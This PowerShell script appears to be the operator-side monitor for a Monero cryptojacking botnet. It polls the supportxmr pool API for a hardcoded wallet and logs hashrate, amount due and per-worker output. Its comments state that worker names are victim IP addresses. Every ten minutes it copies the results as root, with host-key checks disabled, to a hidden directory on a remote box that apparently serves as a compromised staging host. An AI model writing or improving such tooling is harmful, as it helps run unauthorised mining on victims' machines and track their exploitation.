# PC-side pool fetcher. Box1 cannot read the pool's HTTP API at all (it connects and
# gets 0 bytes, three ways), and this PC's resolver hangs on the name - so: pin the
# pool node IP with --resolve and run the whole thing as a detached PowerShell process
# so a killed terminal cannot truncate it.
# Writes pcdock/fleet_pc.tsv and pushes it to box1's .hunt/fleet.tsv for the rate calc.
$ErrorActionPreference = 'Continue'
$d = 'c:\Users\Patrick\OneDrive\Desktop\test1'
$W = '46Md49vuZSSDDG5e2FhStfYxszzfDgnjH6gU2YU8zHrS5QihNkwb5PFNTHCkPhoKpG3k6zGP1SpeTRVgVDZFFQQuCetBqU6'
$u = "https://www.supportxmr.com/api/miner/$W/stats"
$ips = @()
$tsv = Join-Path $d 'pcdock\fleet_pc.tsv'
$log = Join-Path $d 'pcdock\pool_pc.log'
$key = Join-Path $d 'id_key'
$aw = Join-Path $d 'pcdock\_workers.json'
while ($true) {
    $got = $false
    foreach ($ip in @('__direct__','141.95.72.59')) {
        $raw = Join-Path $d 'pcdock\_raw.json'
        if ($ip -eq '__direct__') {
            & curl.exe -sS -k -m 20 -L -H 'Cache-Control: no-cache' -o $raw $u
        } else {
            & curl.exe -sS -k -m 20 --resolve "pool.supportxmr.com:443:$ip" -o $raw $u
        }
        if ((Test-Path $raw) -and ((Get-Item $raw).Length -gt 100)) { $got = $true; break }
    }
    if ($got) {
        $t = [int][double]::Parse((Get-Date -UFormat %s))
        $txt = Get-Content $raw -Raw
        $g = { param($k) if ($txt -match "`"$k`":([0-9]+)") { $matches[1] } else { 0 } }
        $line = "$t`t$(& $g 'hash')`t$(& $g 'hash2h')`t$(& $g 'amtDue')`t$(& $g 'totalHashes')`t$(& $g 'validShares')"
        Add-Content -Path $tsv -Value $line
        # Per-worker production. The wallet /stats endpoint is global only (182 bytes);
        # the per-worker map lives at /stats/allWorkers as {"<name>":{...,"identifer":
        # "<name>","hash":N,...}} - note the pool's own typo, identifer, and that hash
        # follows the name. Worker name == victim IP because dock.sh passes --rig-id.
        # This is the only per-host truth that needs no inbound port at all.
        & curl.exe -sS -k -m 15 -o $aw "https://www.supportxmr.com/api/miner/$W/stats/allWorkers"
        if ((Test-Path $aw) -and ((Get-Item $aw).Length -gt 20)) {
            $wa = Get-Content $aw -Raw
            foreach ($m in [regex]::Matches($wa, '"identifer":"([^"]+)","hash":([0-9]+)')) {
                $id = $m.Groups[1].Value
                if ($id -eq 'global') { continue }
                Add-Content -Path $tsv -Value ("W`t" + $id + "`t" + $m.Groups[2].Value)
            }
        }
        Add-Content -Path $log -Value ("pool_pc: hash=" + (& $g 'hash') + " amtDue=" + (& $g 'amtDue') + " via $ip")
        & scp.exe -i $key -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR $tsv root@167.233.74.146:/tmp/.sysd/.hunt/fleet.tsv
    } else {
        Add-Content -Path $log -Value 'pool_pc: all fetch attempts short/failed'
    }
    Start-Sleep -Seconds 600
}
